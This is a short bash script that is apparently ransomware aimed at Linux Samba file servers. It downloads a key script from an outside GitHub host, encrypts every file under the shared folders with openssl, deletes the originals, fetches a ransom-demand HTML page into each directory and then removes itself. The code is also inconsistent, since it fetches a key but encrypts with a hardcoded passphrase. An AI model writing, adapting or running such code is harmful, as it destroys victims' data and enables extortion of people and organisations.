#!/bin/bash

# Payment demand splash screen
splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ransomware_splash.html"

# Folder to encrypt
targetFolder="/shares"

# Samba folders only. Set to False to target only $targetFolder
smb="True"

# Get AES encryption key
wget 'https://raw.githubusercontent.com/absane/Tricks/master/ransom/key.php' -O /tmp/key.php --no-check-certificate
. /tmp/dynamicconfig.ini
KEY=$(php /tmp/key.php $DEVICEID)
rm /tmp/key.php

# Encrypt files
if [ $smb == "True" ]
then
	for file in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
	do
		find -L "$file" -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
	done
else
	find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
fi


#	Warn user their files are encrypted
curl $splashLocation -s > /tmp/READTHIS_YourFilesAreEncrypted.html
find -L $targetFolder -type d -exec cp /tmp/READTHIS_YourFilesAreEncrypted.html '{}' \;

rm /tmp/ransom.sh
